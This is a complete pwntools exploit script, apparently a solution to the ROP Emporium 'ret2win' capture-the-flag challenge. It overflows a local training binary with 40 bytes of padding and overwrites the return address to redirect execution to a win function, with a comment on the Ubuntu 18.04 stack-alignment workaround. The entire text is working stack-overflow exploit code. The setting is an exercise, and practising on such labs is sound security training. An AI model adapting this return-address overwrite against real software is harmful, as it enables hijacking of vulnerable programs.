from pwn import *

ret2win = 0x400811
p = process('./ret2win')

padding = 'A'*40
exploit = padding + p64(ret2win+1) 

#+1 incase you have a Ubuntu 18.04 system to skip past the push instruction
# For more info see MOVAPS issue https://ropemporium.com/guide.html#Common%20pitfalls

p.recvuntil('>')
p.sendline(exploit)

print p.recvuntil('}')
